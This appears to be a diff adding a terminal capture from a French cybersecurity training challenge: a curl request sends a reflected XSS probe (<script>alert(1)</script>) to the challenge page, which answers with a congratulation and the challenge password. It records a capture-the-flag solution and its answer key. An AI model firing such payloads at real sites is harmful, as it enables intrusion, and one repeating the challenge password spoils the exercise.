@@ -1,0 +1,14 @@
+┌──(root㉿DESKTOP-NMNGEGI)-[/home/br0nson]
+└─# curl "https://cyber-learning.fr/wp-content/plugins/bts-cyber/challenges/web/web13/index.php?jeton=wBFK4uHHfJ14&page=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+
+<html>
+    <head>
+        <title>Scripts intersites</title>
+        <link rel="stylesheet" href="../style.css">
+    </head>
+   <body>
+   <section class="cyberpunk black both">
+
+<h1>Bravo, vous savez comment detecter une faille XSS.<br>Le mot de passe est  : mwGS3doyJU5fqA</h1></section>
+</body>
+</html>
